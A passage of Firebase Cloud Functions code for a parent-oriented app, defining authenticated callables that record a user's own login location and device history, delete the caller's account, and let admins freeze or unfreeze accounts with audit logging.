  });

// C6. --- EXISTING FEATURE PRESERVED: User Location Update ---
// NOTE: This function is called by parent/admin users to log their own login location
// SECURITY: Writes to profile_data/login_history which stores parent's login info
// Each parent can only write their own login history
exports.updateUserLocation = functions.region(REGION).https.onCall(async (data, context) => {
    if (!context.auth) throw new functions.https.HttpsError('unauthenticated', 'Login required.');
    const uid = context.auth.uid;
    const { ip, city, device, country, lat, lon, browser } = data;
    
    // --- NEW FEATURE ADDED: Parent IP Tracking ---
    const loginHistory = {
        ip: ip || 'Unknown',
        city: city || 'Unknown',
        country: country || 'Unknown',
        device: device || 'Unknown',
        browser: browser || 'Android App',
        timestamp: admin.database.ServerValue.TIMESTAMP,
        requested_by: uid
    };
    
    // Log to login history (parent IP tracking) - each admin logs their own login
    await db.ref(`user/${uid}/profile_data/login_history`).push(loginHistory);
    
    // Update location info - used for admin dashboard to show last login location
    await db.ref(`user/${uid}/profile_data/location_info`).update({
        ip: ip || 'Unknown',
        city: city || 'Unknown',
        country: country || 'Unknown',
        device: device || 'Unknown',
        browser: browser || 'Android App',
        coords: { lat: lat || 0, lon: lon || 0 },
        lastLoginTime: admin.database.ServerValue.TIMESTAMP
    });
    
    return { success: true, message: "Location and login history updated." };
});

// C7. --- EXISTING FEATURE PRESERVED: Account Deletion ---
exports.deleteMyAccount = functions.region(REGION).https.onCall(async (data, context) => {
    if (!context.auth) throw new functions.https.HttpsError('unauthenticated', 'Login required.');
    const uid = context.auth.uid;
    
    // Deletion is handled by the onDelete trigger (A2)
    await admin.auth().deleteUser(uid);
    
    return { success: true, message: "Account deleted successfully." };
});

/**
 * 🔒 FREEZE USER ACCOUNT - Toggle freeze status
 * Admin-only function to freeze/unfreeze user accounts
 * Writes to profile_data/security via admin privileges
 */
exports.freezeUserAccount = functions.region(REGION).https.onCall(async (data, context) => {
    await verifyAdmin(context);
    
    const { targetUid, isFrozen } = data;
    if (!targetUid || typeof isFrozen !== 'boolean') {
        throw new functions.https.HttpsError('invalid-argument', 'targetUid and isFrozen are required');
    }
    
    try {
        await db.ref(`user/${targetUid}/profile_data/security`).update({ is_frozen: isFrozen });
        
        await logSystemAction(
            isFrozen ? 'ACCOUNT_FROZEN' : 'ACCOUNT_UNFROZEN',
            context.auth.uid,
            { targetUid, timestamp: admin.database.ServerValue.TIMESTAMP }
        );
        
        return { 
            success: true, 
            message: isFrozen ? 'Account frozen successfully' : 'Account unfrozen successfully'
        };
    } catch (error) {
        throw new functions.https.HttpsError('internal', 'Failed to update freeze status');
    }
});